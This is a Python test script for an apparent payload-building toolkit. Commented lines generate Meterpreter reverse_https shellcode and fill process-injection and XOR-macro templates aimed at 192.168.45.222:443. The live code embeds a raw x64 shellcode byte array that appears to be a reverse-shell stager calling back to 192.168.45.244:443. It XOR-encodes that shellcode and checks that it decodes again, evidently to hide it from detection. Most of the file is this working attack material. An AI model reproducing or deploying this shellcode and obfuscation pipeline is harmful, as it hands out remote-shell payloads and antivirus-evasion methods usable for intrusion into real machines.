import ep_gensc
import ep_templater
import ep_c_xor

#code = gensc.GetShellCode("windows/x64/meterpreter/reverse_https", "192.168.45.222", "443", "ps1")
#print("The following print comes from the test code")
#print(code)

#ev_templater.FillTemplate("psprocessinjectionbyname","windows/x64/meterpreter/reverse_https", "192.168.45.222", "443")

#ep_templater.FillTemplate("xormacro","windows/meterpreter/reverse_https", "192.168.45.222", "443")



input = """unsigned char buf[] = "\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x01\xbb\xc0\xa8\x2d\xf4\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";"""
inputstring = ''.join('\\x{:02x}'.format(ord(c)) for c in input)
test = ep_c_xor.run(input,{"xorChar":"J"})


backtostart = ep_c_xor.run(test,{"xorChar":"J"})

if input == backtostart:
    print("ok")
else:
    print("fail")
    print(inputstring)
    print(backtostart)

